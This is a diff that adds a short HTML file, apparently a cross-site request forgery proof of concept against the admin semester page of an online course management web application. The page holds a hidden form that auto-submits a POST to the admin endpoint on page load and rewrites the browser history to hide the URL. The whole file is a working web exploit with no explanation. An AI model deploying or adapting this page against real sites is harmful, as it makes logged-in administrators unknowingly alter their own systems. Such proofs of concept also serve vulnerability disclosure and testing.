@@ -1,0 +1,13 @@
+<html>
+	<body>
+		<form name='myForm' id='myForm' method="POST" action="https://192.168.29.232/onlinecourse/admin/semester.php">
+			<input type="hidden" name="semester" value="0000"/>
+			<input type="hidden" name="submit" value=""/>
+			<input type="submit" value="Submit">
+		</form>
+		<script>
+			history.pushState('', '', '/');
+			document.forms[0].submit();
+		</script>
+	</body>
+<html>
